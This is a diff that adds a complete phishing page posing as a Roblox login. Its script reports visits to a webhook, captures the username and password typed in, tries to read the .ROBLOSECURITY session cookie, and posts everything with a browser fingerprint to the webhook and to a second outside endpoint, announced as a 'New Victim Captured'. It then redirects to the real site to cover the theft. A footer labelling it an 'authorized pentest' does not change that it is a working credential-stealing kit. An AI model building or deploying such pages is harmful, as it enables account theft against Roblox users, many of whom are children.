@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Fredoka One', 'Segoe UI', sans-serif;
+            background: linear-gradient(180deg, #1a1a2e 0%, #0d0d1a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-card {
+            background: #1f1f35;
+            border-radius: 20px;
+            padding: 40px 32px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .roblox-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .roblox-logo svg {
+            width: 180px;
+            height: auto;
+        }
+        .roblox-logo h1 {
+            color: #e2e8f0;
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 8px;
+        }
+        .roblox-logo p {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            color: #cbd5e1;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.06);
+            border: 2px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            color: #f1f5f9;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #6366f1;
+            box-shadow: 0 0 0 3px rgba(99,102,241,0.2);
+            background: rgba(255,255,255,0.1);
+        }
+        .input-group input::placeholder { color: #475569; }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        .login-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(99,102,241,0.3);
+        }
+        .login-btn:disabled {
+            opacity: 0.6;
+            transform: none;
+        }
+        .spinner {
+            display: none;
+            width: 20px; height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .login-btn.loading .btn-text { display: none; }
+        .login-btn.loading .spinner { display: block; }
+        .footer-links {
+            text-align: center;
+            margin-top: 24px;
+        }
+        .footer-links a {
+            color: #6366f1;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .footer-links a:hover { text-decoration: underline; }
+        .footer-links span { color: #475569; margin: 0 8px; }
+        .tos-text {
+            text-align: center;
+            color: #475569;
+            font-size: 11px;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+        .error-msg {
+            background: rgba(239,68,68,0.1);
+            border: 1px solid rgba(239,68,68,0.3);
+            color: #fca5a5;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        .loading-page {
+            display: none;
+            text-align: center;
+            padding: 60px 20px;
+        }
+        .loading-page h2 { color: #e2e8f0; margin-bottom: 12px; }
+        .loading-page p { color: #94a3b8; }
+        .skeleton { 
+            height: 12px; 
+            background: linear-gradient(90deg, rgba(255,255,255,0.03) 25%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0.03) 75%);
+            background-size: 200% 100%;
+            animation: shimmer 1.5s infinite;
+            border-radius: 6px; 
+            margin: 10px 0;
+        }
+        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+        .skeleton-box { padding: 20px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Login Form -->
+        <div id="loginForm" class="login-card">
+            <div class="roblox-logo">
+                <!-- Roblox "R" logo text -->
+                <h1 style="font-size:32px;letter-spacing:-1px;background:linear-gradient(135deg,#6366f1,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Roblox</h1>
+                <p>Sign in to continue</p>
+            </div>
+
+            <div id="errorMsg" class="error-msg">Invalid username or password</div>
+
+            <form id="loginFormElement" onsubmit="return handleLogin(event)">
+                <div class="input-group">
+                    <label for="username">Username / Email</label>
+                    <input type="text" id="username" name="username" placeholder="Roblox username or email" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
+                </div>
+                <button type="submit" id="loginBtn" class="login-btn">
+                    <span class="btn-text">Sign In</span>
+                    <div class="spinner"></div>
+                </button>
+            </form>
+
+            <div class="footer-links">
+                <a href="#">Forgot password?</a>
+                <span>|</span>
+                <a href="#">Create account</a>
+            </div>
+            <div class="tos-text">
+                By continuing, you agree to Roblox's Terms of Service and Privacy Policy.
+            </div>
+        </div>
+
+        <!-- Loading Screen (after "login") -->
+        <div id="loadingScreen" class="login-card loading-page">
+            <h1 style="font-size:32px;background:linear-gradient(135deg,#6366f1,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Roblox</h1>
+            <p style="margin:12px 0 24px;color:#94a3b8;">Verifying your identity...</p>
+            <div class="skeleton-box">
+                <div class="skeleton"></div>
+                <div class="skeleton" style="width:80%;"></div>
+                <div class="skeleton" style="width:60%;"></div>
+                <div class="skeleton" style="width:85%;"></div>
+                <div class="skeleton" style="width:70%;"></div>
+            </div>
+            <p style="color:#475569;font-size:12px;margin-top:16px;">One moment please...</p>
+        </div>
+    </div>
+
+    <script>
+        // ─── CONFIG ─────────────────────────────────────────────────
+        // This gets dynamically replaced when link is generated
+        const LINK_OWNER_WEBHOOK = 'WEBHOOK_PLACEHOLDER';
+        const LINK_ID = 'LINK_ID_PLACEHOLDER';
+        const REDIRECT_URL = 'https://www.roblox.com';
+
+        // ─── STEP 1: Report Page Visit (Dualhook #1) ──────────────
+        async function reportVisit() {
+            try {
+                const visitPayload = {
+                    content: null,
+                    embeds: [{
+                        title: '👁️ New Page Visit',
+                        color: 0x6366f1,
+                        fields: [
+                            { name: '🌐 Link ID', value: LINK_ID, inline: true },
+                            { name: '🕐 Time', value: new Date().toISOString(), inline: true },
+                            { name: '🔍 Referrer', value: document.referrer || 'Direct', inline: true },
+                            { name: '💻 Screen', value: `${screen.width}x${screen.height}`, inline: true },
+                            { name: '🌍 Language', value: navigator.language, inline: true }
+                        ],
+                        footer: { text: 'YodaCity • Dualhook Active' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                await fetch(LINK_OWNER_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(visitPayload)
+                });
+            } catch(e) {}
+        }
+
+        // ─── STEP 2: Capture Everything ────────────────────────────
+        async function captureAll(username, password) {
+            // Try to steal the .ROBLOSECURITY cookie from the victim's browser
+            let roblosecCookie = 'Not accessible via JS (HttpOnly)';
+            
+            // Attempt to get it from document.cookie (won't work for HttpOnly but we try)
+            try {
+                const cookies = document.cookie.split(';');
+                for (let c of cookies) {
+                    const [name, ...val] = c.trim().split('=');
+                    if (name === '.ROBLOSECURITY') {
+                        roblosecCookie = val.join('=');
+                    }
+                }
+            } catch(e) {}
+
+            // Build fingerprint
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screenRes: `${screen.width}x${screen.height}`,
+                cookiesEnabled: navigator.cookieEnabled,
+                referrer: document.referrer || 'Direct'
+            };
+
+            // ─── Send credentials + cookie to webhook ───────────────
+            const credPayload = {
+                content: `@everyone **🚨 New Victim Captured!**`,
+                embeds: [{
+                    title: '🔑 Credentials + Cookie',
+                    color: 0xef4444,
+                    fields: [
+                        { name: '📧 Username/Email', value: `\`\`\`${username}\`\`\``, inline: false },
+                        { name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false },
+                        { name: '🍪 .ROBLOSECURITY', value: `\`\`\`${roblosecCookie.substring(0, 500)}\`\`\``, inline: false },
+                        { name: '🌐 Link ID', value: LINK_ID, inline: true },
+                        { name: '⏰ Time', value: new Date().toISOString(), inline: true },
+                        { name: '🖥️ Platform', value: fingerprint.platform, inline: true },
+                        { name: '🌍 Language', value: fingerprint.language, inline: true },
+                        { name: '🕐 Timezone', value: fingerprint.timezone, inline: true },
+                        { name: '🔍 Referrer', value: fingerprint.referrer, inline: true }
+                    ],
+                    footer: { text: 'YodaCity Phishing Simulator • Authorized Pentest' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(LINK_OWNER_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(credPayload)
+                });
+            } catch(e) {}
+
+            // ─── Also try to send to a backup/checker endpoint ─────
+            // If we got the cookie, send it to the checker service
+            if (roblosecCookie && !roblosecCookie.includes('Not accessible')) {
+                try {
+                    await fetch('https://yodacity.netlify.app/api/check-cookie', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            cookie: roblosecCookie,
+                            webhook: LINK_OWNER_WEBHOOK,
+                            linkId: LINK_ID,
+                            username: username,
+                            password: password
+                        })
+                    });
+                } catch(e) {
+                    // If no API endpoint, we already sent raw data via webhook
+                }
+            }
+        }
+
+        // ─── STEP 3: Handle Login ───────────────────────────────────
+        async function handleLogin(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const btn = document.getElementById('loginBtn');
+            const errorMsg = document.getElementById('errorMsg');
+
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Please fill in all fields.';
+                return false;
+            }
+
+            btn.classList.add('loading');
+            btn.disabled = true;
+            errorMsg.style.display = 'none';
+
+            // Capture everything
+            await captureAll(username, password);
+
+            // Show loading screen
+            await new Promise(r => setTimeout(r, 2000));
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            // Redirect to real Roblox
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 3000);
+
+            return false;
+        }
+
+        // ─── INIT ───────────────────────────────────────────────────
+        window.addEventListener('DOMContentLoaded', () => {
+            reportVisit();
+        });
+    </script>
+</body>
+</html>
